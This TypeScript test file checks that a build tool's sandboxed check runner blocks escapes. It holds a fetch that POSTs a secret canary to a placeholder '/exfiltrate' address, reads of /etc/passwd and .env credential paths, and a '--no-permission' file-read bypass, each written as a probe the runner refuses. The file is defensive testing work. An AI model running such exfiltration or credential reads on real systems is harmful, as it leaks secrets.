import assert from "node:assert/strict";
import { cp, link, lstat, mkdir, mkdtemp, readFile, readdir, rm, symlink, writeFile } from "node:fs/promises";
import { spawnSync } from "node:child_process";
import { join, resolve } from "node:path";
import test, { type TestContext } from "node:test";
import { confinedNodeTestLaunch, prepareFocusedCheck, readGraphDerivedCheckReceipt, runGraphDerivedCheck } from "../../src/commands/check.ts";
import { canonicalDigest, canonicalJson } from "../../src/core/canonical.ts";
import { loadSemanticGraph } from "../../src/graph/index.ts";
import { deriveWork, type WorkPacket } from "../../src/graph/work.ts";
import { candidateScope, materialiseCandidate, type CandidateSpec } from "../../src/realisation/index.ts";
import type { RealisationBasis } from "../../src/realisation/basis.ts";

const sourceRoot = resolve(import.meta.dirname, "../..");
const workspaceTemporaryRoot = process.env.TMPDIR === undefined ? resolve(sourceRoot, ".usf/tmp") : resolve(process.env.TMPDIR);
const manifestPath = "graph/manifests/self-host.json";
const profile = "urn:usf:profile:v3-self-host:1";
const workId = "urn:usf:work:realisation-basis-chain";
const targetPath = "tests/adversarial/realisation-check.test.ts";
type ProfileBoundPacket = WorkPacket & Readonly<{ realisationBasis: RealisationBasis }>;

async function assertConfinedNetworkNamespace(): Promise<void> {
  if (process.env.USF_BWRAP_NETWORK !== "isolated") return;
  const routes = (await readFile("/proc/net/route", "utf8")).trimEnd().split("\n");
  assert.equal(routes.length, 1, "the focused child network namespace exposes no route");
  await assert.rejects(() => readFile("/etc/passwd", "utf8"), { code: "ENOENT" }, "an unmounted host path remains absent");
  const repositoryRoot = process.env.USF_REPOSITORY_ROOT!;
  for (const path of [join(repositoryRoot, ".env"), join(repositoryRoot, ".usf/home"), "/home/user/src/usf-v2/GOAL.md"]) {
    await assert.rejects(
      () => readFile(path, "utf8"),
      (error: unknown) => error instanceof Error && "code" in error && ["ENOENT", "ERR_ACCESS_DENIED"].includes(String(error.code)),
      `confined credential or historical read must fail: ${path}`,
    );
  }
  await assert.rejects(
    () => writeFile("/tmp/usf-candidate-escape", "refused\n", "utf8"),
    (error: unknown) => error instanceof Error && "code" in error && ["ENOENT", "ERR_ACCESS_DENIED"].includes(String(error.code)),
    "a write outside the candidate and controlled scratch must fail",
  );
  assert.throws(
    () => spawnSync("/usr/bin/true"),
    (error: unknown) => error instanceof Error && "code" in error && error.code === "ERR_ACCESS_DENIED",
    "an unapproved child process must fail",
  );
  const secretCanary = "sk-usf-adversarial-canary-do-not-exfiltrate";
  await assert.rejects(
    () => fetch("http://192.0.2.1:9/exfiltrate", {
      method: "POST",
      body: secretCanary,
      signal: AbortSignal.timeout(1_000),
    }),
    "a route-free namespace must refuse the network and canary exfiltration attempt",
  );
  assert.equal(process.env.NODE_OPTIONS, undefined, "the focused child receives no ambient Node options");
}

function lockProcessUnavailable(context: TestContext): boolean {
  const permission = (process as typeof process & { permission?: { has(scope: string): boolean } }).permission;
  if (permission === undefined || permission.has("child_process")) return false;
  context.skip("lock-owning USF operations are proven by the direct outer component validation");
  return true;
}

async function fixture(context: TestContext): Promise<string> {
  await mkdir(workspaceTemporaryRoot, { recursive: true, mode: 0o700 });
  const parent = await mkdtemp(join(workspaceTemporaryRoot, "usf-focused-check-"));
  const root = join(parent, "repo");
  await mkdir(root);
  for (const entry of await readdir(sourceRoot, { withFileTypes: true })) {
    if (entry.name === ".git" || entry.name === "node_modules" || entry.name.startsWith(".usf")) continue;
    await cp(join(sourceRoot, entry.name), join(root, entry.name), { recursive: true });
  }
  context.after(() => rm(parent, { recursive: true, force: true }));
  return root;
}

function basisFor(root: string): RealisationBasis {
  const result = deriveWork(loadSemanticGraph(root, manifestPath), { profile, selector: workId });
  const packet = result.items?.[0] as ProfileBoundPacket | undefined;
  assert.equal(result.status, "ok");
  assert.ok(packet?.realisationBasis);
  return packet.realisationBasis;
}

async function candidate(root: string, nonce: string): Promise<CandidateSpec> {
  const basis = basisFor(root);
  const operations = [{ kind: "write" as const, path: targetPath, content: await readFile(join(root, targetPath), "utf8") }];
  const acceptedContributionDigests = [canonicalDigest({ nonce })];
  return {
    digest: canonicalDigest({ basisDigest: basis.basisDigest, operations, acceptedContributionDigests }, { rejectAbsolutePaths: true }),
    basis,
    operations,
    lineage: { acceptedContributionDigests, rejected: [] },
    scope: candidateScope(basis),
    writeSet: [targetPath],
    preimages: { [targetPath]: basis.scope.preimages[targetPath]! },
  };
}

test("focused checks rederive the persisted basis before enforcing the command allowlist", async (context) => {
  await assertConfinedNetworkNamespace();
  if (lockProcessUnavailable(context)) return;
  const root = await fixture(context);
  const spec = await candidate(root, "confinement");
  const { workspace } = await materialiseCandidate(root, spec);
  assert.equal(spec.basis.work.dependencies.some((dependency) => dependency.key === "tests/fixtures/providers/"), true);
  assert.deepEqual(
    await readFile(join(workspace, "tests/fixtures/providers/models-dev.json")),
    await readFile(join(root, "tests/fixtures/providers/models-dev.json")),
  );

  const refused = await prepareFocusedCheck(root, spec.digest, [], "anything");
  assert.equal(refused.status, "refused");
  assert.equal(refused.reasonCode, "CHECK_NOT_ALLOWLISTED");
  assert.equal(refused.basis?.basisDigest, spec.basis.basisDigest);

  const confined = await prepareFocusedCheck(root, spec.digest, [{
    id: "bounded-test",
    command: ["node", "--test", "--test-isolation=none", "tests/unit/providers/routing.test.ts"],
  }], "bounded-test");
  assert.equal(confined.status, "ready");
  if (confined.status !== "ready") return;
  assert.equal(confined.basis.basisDigest, spec.basis.basisDigest);
  assert.equal(confined.executable, "/usr/bin/bwrap");
  assert.equal(confined.arguments[0], "--unshare-user");
  assert.equal(confined.arguments.includes("--unshare-net"), true);
  assert.equal(confined.arguments.includes("--clearenv"), true);
  assert.equal(confined.arguments.includes("--permission"), true);
  const readPermissions = confined.arguments.filter((argument) => argument.startsWith("--allow-fs-read="));
  assert.equal(readPermissions[0], `--allow-fs-read=${confined.workspace}`);
  assert.equal(readPermissions.length, 5);
  assert.equal(readPermissions[1]?.endsWith("/node_modules"), true);
  assert.equal(readPermissions[2]?.endsWith("/.usf/cache"), true);
  assert.equal(readPermissions[3], "--allow-fs-read=/etc/passwd");
  assert.equal(readPermissions[4], "--allow-fs-read=/proc/net/route");
  assert.equal(confined.arguments.some((argument) => argument === "--allow-child-process" || argument === "--allow-net"), false);

  const externalDependencyRoot = join(root, "external-node-modules");
  await mkdir(externalDependencyRoot, { mode: 0o700 });
  assert.equal(confinedNodeTestLaunch(
    confined.workspace,
    join(confined.workspace, ".usf-check-tmp"),
    [externalDependencyRoot, resolve(sourceRoot, ".usf/cache")],
    ["node", "--test", "--test-isolation=none", "tests/unit/providers/routing.test.ts"],
  ), null, "an owner-controlled external directory cannot replace the configured V3 dependency root");

  const bypass = await prepareFocusedCheck(root, spec.digest, [{
    id: "permission-bypass",
    command: ["node", "--no-permission", "--eval", "import('node:fs').then((fs) => fs.readFileSync('/etc/passwd'))"],
  }], "permission-bypass");
  assert.equal(bypass.status, "refused");
  assert.equal(bypass.reasonCode, "CHECK_CONFINEMENT_UNAVAILABLE");

  const traversal = await prepareFocusedCheck(root, spec.digest, [{
    id: "test-traversal",
    command: ["node", "--test", "--test-isolation=none", "../../outside.test.ts"],
  }], "test-traversal");
  assert.equal(traversal.status, "refused");
  assert.equal(traversal.reasonCode, "CHECK_CONFINEMENT_UNAVAILABLE");
});

test("check refuses planted missing, fabricated and stale workspace authority", async (context) => {
  if (lockProcessUnavailable(context)) return;
  const root = await fixture(context);
  const allowlist = [{ id: "noop", command: ["node", "--test", "--test-isolation=none", "tests/unit/providers/routing.test.ts"] }] as const;
  const scenarios: Array<{ name: string; plant: (root: string, workspace: string) => Promise<void>; reason: string; graphDerived?: boolean }> = [
    {
      name: "validation not bound by the construction basis",
      plant: async () => undefined,
      reason: "CHECK_VALIDATION_NOT_BOUND",
      graphDerived: true,
    },
    {
      name: "missing persisted basis",
      plant: async (_root, workspace) => {
        const path = join(workspace, ".usf-workspace.json");
        const manifest = JSON.parse(await readFile(path, "utf8")) as Record<string, unknown>;
        delete manifest.basis;
        await writeFile(path, JSON.stringify(manifest));
      },
      reason: "INVALID_WORKSPACE_MANIFEST",
    },
    {
      name: "fabricated persisted basis",
      plant: async (_root, workspace) => {
        const path = join(workspace, ".usf-workspace.json");
        const manifest = JSON.parse(await readFile(path, "utf8")) as { basis: { inputs: { policyDigest: string } } };
        manifest.basis.inputs.policyDigest = canonicalDigest("fabricated");
        await writeFile(path, JSON.stringify(manifest));
      },
      reason: "INVALID_REALISATION_BASIS",
    },
    {
      name: "mutated basis-bound dependency",
      plant: async (_root, workspace) => {
        const path = join(workspace, "schemas/provider-config.schema.json");
        await writeFile(path, `${await readFile(path, "utf8")}\n`);
      },
      reason: "CANDIDATE_BASIS_MISMATCH",
    },
    {
      name: "mutated graph-declared directory leaf",
      plant: async (_root, workspace) => {
        const path = join(workspace, "tests/fixtures/providers/models-dev.json");
        await writeFile(path, `${await readFile(path, "utf8")}\n`);
      },
      reason: "CANDIDATE_BASIS_MISMATCH",
    },
    {
      name: "extra empty candidate directory",
      plant: async (_root, workspace) => {
        await mkdir(join(workspace, "tests/fixtures/providers/extra-empty"), { recursive: true });
      },
      reason: "CANDIDATE_BASIS_MISMATCH",
    },
    {
      name: "stale policy input",
      plant: async (repositoryRoot) => {
        const path = join(repositoryRoot, "config/privacy.json");
        await writeFile(path, `${await readFile(path, "utf8")}\n`);
      },
      reason: "STALE_REALISATION_BASIS",
    },
  ];

  for (const scenario of scenarios) {
    const spec = await candidate(root, scenario.name);
    const { workspace } = await materialiseCandidate(root, spec);
    await scenario.plant(root, workspace);
    const result = scenario.graphDerived === true
      ? await runGraphDerivedCheck(root, spec.digest, "urn:usf:validation:not-bound")
      : await prepareFocusedCheck(root, spec.digest, allowlist, "noop");
    assert.equal(result.status, "refused", scenario.name);
    assert.equal(result.reasonCode, scenario.reason, scenario.name);
    if (scenario.name === "stale policy input") break;
  }
});

test("graph-derived check persists one canonical owner-only receipt and refuses tampered readback", async (context) => {
  await assertConfinedNetworkNamespace();
  if (lockProcessUnavailable(context)) return;
  const root = await fixture(context);
  const spec = await candidate(root, "durable-graph-derived-receipt");
  await materialiseCandidate(root, spec);
  const validationId = "urn:usf:validation:realisation-basis-chain-focused";

  const result = await runGraphDerivedCheck(root, spec.digest, validationId);
  assert.equal(result.status, "pass", result.status === "refused" ? result.reasonCode : undefined);
  if (result.status !== "pass") return;
  assert.equal(result.basis.basisDigest, spec.basis.basisDigest);
  assert.equal(result.receipt.schema, "urn:usf:checked-candidate-receipt:1");
  assert.equal(result.receipt.candidateDigest, spec.digest);
  assert.equal(result.receipt.originalConstructionBasisDigest, spec.basis.basisDigest);
  assert.equal(result.receipt.scopedDependencyDigest, spec.basis.work.scopedDependencyDigest);
  assert.equal(result.receipt.validationObligationIri, validationId);
  assert.deepEqual(result.receipt.validationCommandTokens, [
    "node", "--test", "--test-isolation=none", "tests/unit/providers/routing.test.ts", "tests/contract/fake-call-resolve.test.ts",
    "tests/unit/realisation/workspace.test.ts", "tests/adversarial/realisation-check.test.ts", "tests/integration/bootstrap-loop.test.ts",
  ]);
  assert.equal(result.receipt.validationEnvironmentIri, "urn:usf:environment:hermetic");
  assert.equal(result.receipt.validationExecutionModeIri, "urn:usf:mode:deterministic-test-substitute");
  assert.equal(result.receipt.validationToolDependencies.some((dependency) => dependency.kind === "host-tool" && dependency.id === "urn:usf:host-tool:bwrap:0.9.0"), true);
  assert.equal(result.receipt.exitCode, 0);
  const { receiptDigest, ...receiptWithoutDigest } = result.receipt;
  assert.equal(receiptDigest, canonicalDigest(receiptWithoutDigest, { rejectAbsolutePaths: true }));
  assert.equal(Object.keys(result.receipt).some((field) => ["timestamp", "createdAt", "runId"].includes(field)), false);

  const expectedPath = `.usf/receipts/check/${spec.digest.slice("sha256:".length)}/${canonicalDigest(validationId).slice("sha256:".length)}.json`;
  assert.equal(result.receiptPath, expectedPath);
  const receiptPath = join(root, result.receiptPath);
  const receiptEntry = await lstat(receiptPath);
  assert.equal(receiptEntry.isSymbolicLink(), false);
  assert.equal(receiptEntry.isFile(), true);
  assert.equal(receiptEntry.mode & 0o777, 0o600);
  assert.equal(await readFile(receiptPath, "utf8"), canonicalJson(result.receipt, { rejectAbsolutePaths: true }));
  const authenticatedReadback = await readGraphDerivedCheckReceipt(root, spec.digest, validationId);
  assert.equal(authenticatedReadback?.receiptPath, expectedPath);
  assert.deepEqual(authenticatedReadback?.receipt, result.receipt);

  const pendingPath = `${receiptPath}.pending`;
  await link(receiptPath, pendingPath);
  assert.equal((await lstat(receiptPath)).nlink, 2);
  const linkedRecovery = await runGraphDerivedCheck(root, spec.digest, validationId);
  assert.equal(linkedRecovery.status, "pass", linkedRecovery.status === "refused" ? linkedRecovery.reasonCode : undefined);
  assert.equal((await lstat(receiptPath)).nlink, 1);
  await assert.rejects(() => lstat(pendingPath), { code: "ENOENT" });

  await link(receiptPath, pendingPath);
  await rm(receiptPath);
  assert.equal((await lstat(pendingPath)).nlink, 1);
  const pendingRecovery = await runGraphDerivedCheck(root, spec.digest, validationId);
  assert.equal(pendingRecovery.status, "pass", pendingRecovery.status === "refused" ? pendingRecovery.reasonCode : undefined);
  assert.equal((await lstat(receiptPath)).nlink, 1);
  await assert.rejects(() => lstat(pendingPath), { code: "ENOENT" });

  const hostileLink = join(root, "hostile-receipt-hardlink");
  await link(receiptPath, hostileLink);
  const hostileHardlink = await runGraphDerivedCheck(root, spec.digest, validationId);
  assert.equal(hostileHardlink.status, "refused");
  assert.equal(hostileHardlink.reasonCode, "CHECK_RECEIPT_PATH_UNSAFE");
  await rm(hostileLink);

  const symlinkSpec = await candidate(root, "receipt-ancestor-symlink");
  await materialiseCandidate(root, symlinkSpec);
  const symlinkTarget = join(root, "receipt-ancestor-target");
  await mkdir(symlinkTarget, { mode: 0o700 });
  const symlinkCandidateDirectory = join(root, ".usf/receipts/check", symlinkSpec.digest.slice("sha256:".length));
  await symlink(symlinkTarget, symlinkCandidateDirectory);
  const hostileAncestor = await runGraphDerivedCheck(root, symlinkSpec.digest, validationId);
  assert.equal(hostileAncestor.status, "refused");
  assert.equal(hostileAncestor.reasonCode, "CHECK_RECEIPT_PATH_UNSAFE");

  const tampered = "{\"tampered\":true}";
  await writeFile(receiptPath, tampered, "utf8");
  const refused = await runGraphDerivedCheck(root, spec.digest, validationId);
  assert.equal(refused.status, "refused");
  assert.equal(refused.reasonCode, "CHECK_RECEIPT_INVALID");
  assert.equal(await readFile(receiptPath, "utf8"), tampered, "a conflicting local observation is never overwritten");

  await rm(receiptPath);
  await symlink(join(root, "package.json"), receiptPath);
  const substituted = await runGraphDerivedCheck(root, spec.digest, validationId);
  assert.equal(substituted.status, "refused");
  assert.equal(substituted.reasonCode, "CHECK_RECEIPT_PATH_UNSAFE");
});

test("graph-derived check enforces graph wall time and mints no timeout receipt", async (context) => {
  if (lockProcessUnavailable(context)) return;
  const root = await fixture(context);
  const graphPath = join(root, "graph/integration.nq");
  const graph = await readFile(graphPath, "utf8");
  const boundedGraph = graph
    .replace('candidateValidationWallTimeMilliseconds> "120000"', 'candidateValidationWallTimeMilliseconds> "1"')
    .replace('validationTerminationGraceMilliseconds> "5000"', 'validationTerminationGraceMilliseconds> "1"')
    .replace('validationMaximumSettlementWallTimeMilliseconds> "125000"', 'validationMaximumSettlementWallTimeMilliseconds> "2"');
  assert.notEqual(boundedGraph, graph);
  await writeFile(graphPath, boundedGraph, "utf8");
  const spec = await candidate(root, "graph-timeout");
  await materialiseCandidate(root, spec);
  const validationId = "urn:usf:validation:realisation-basis-chain-focused";
  const result = await runGraphDerivedCheck(root, spec.digest, validationId);
  assert.equal(result.status, "refused");
  assert.equal(result.reasonCode, "CHECK_TIMEOUT");
  assert.equal(result.validationWallTimeMilliseconds, 1);
  assert.equal(result.validationTerminationGraceMilliseconds, 1);
  assert.equal(result.validationTimedOut, true);
  assert.equal(["SIGTERM", "SIGKILL"].includes(result.validationTimeoutTerminationSignal ?? ""), true);
  assert.match(result.outputResultDigest ?? "", /^sha256:[0-9a-f]{64}$/u);
  assert.equal(await readGraphDerivedCheckReceipt(root, spec.digest, validationId), null);
});
